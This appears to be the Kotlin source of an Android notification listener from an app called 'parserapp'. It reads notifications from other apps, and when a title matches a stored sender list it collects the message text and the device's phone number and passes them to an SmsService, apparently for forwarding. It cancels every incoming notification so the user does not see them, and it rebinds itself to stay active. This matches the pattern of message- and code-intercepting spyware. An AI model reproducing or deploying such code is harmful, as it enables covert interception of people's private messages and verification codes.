package com.example.parserapp.domain

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import com.example.parserapp.di.AppDatabase
import com.example.parserapp.domain.service.SmsService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.firstOrNull
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class NotificationListener : NotificationListenerService() {
    private var componentName: ComponentName? = null

    override fun onCreate() {
        super.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        if(componentName == null) {
            componentName = ComponentName(this, this::class.java)
        }

        componentName?.let {
            requestRebind(it)
            toggleNotificationListenerService(it)
        }
        return START_REDELIVER_INTENT
    }

    private fun toggleNotificationListenerService(componentName: ComponentName) {
        val pm = packageManager
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        pm.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()

        if (componentName == null) {
            componentName = ComponentName(this, this::class.java)
        }

        componentName?.let { requestRebind(it) }
    }

    private suspend fun shouldProcessMessage(context: Context, sender: String): Boolean {
        val senderDao = AppDatabase.getDatabase(context).senderDao()
        return withContext(Dispatchers.IO) {
            senderDao.getAllSenders()
                .firstOrNull()
                ?.any { it.name == sender } ?: false
        }
    }

    @SuppressLint("MissingPermission")
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        val context = applicationContext

        val packageName = sbn?.packageName ?: ""
        if (!packageName.startsWith("com.google.android.") && !packageName.startsWith("com.android")) {
            val extras = sbn?.notification?.extras

            val title = extras?.getCharSequence("android.title").toString()
            CoroutineScope(Dispatchers.IO).launch {
                if (shouldProcessMessage(context, title.trim())) {
                    val text = extras?.getCharSequence("android.text").toString()
                    val phoneNumber = getPhoneNumber(context) ?: "Неизвестный номер"

                    Log.d("ParserSms", "Получено PUSH от: $title, текст: $text")

                    val smsIntent = Intent(context, SmsService::class.java).apply {
                        putExtra("phoneNumber", phoneNumber)
                        putExtra("sender", title)
                        putExtra("message", text)
                        putExtra("isSms", false)
                    }

                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        context.startForegroundService(smsIntent)
                    } else {
                        context.startService(smsIntent)
                    }
                }
            }

        }

        cancelNotification(sbn!!.key)
    }

    @SuppressLint("MissingPermission")
    fun getPhoneNumber(context: Context): String? {
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        var phoneNumber: String? = telephonyManager.line1Number

        Log.d("PhoneNumber", "TelephonyManager вернул: $phoneNumber")

        if (phoneNumber.isNullOrEmpty() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList

            if (!subscriptionInfoList.isNullOrEmpty()) {
                phoneNumber = subscriptionInfoList[0].number
                Log.d("PhoneNumber", "SubscriptionManager вернул: $phoneNumber")
            }
        }

        if (phoneNumber.isNullOrEmpty()) {
            Log.d("PhoneNumber", "Не удалось получить номер телефона.")
            return null
        }

        return phoneNumber
    }
}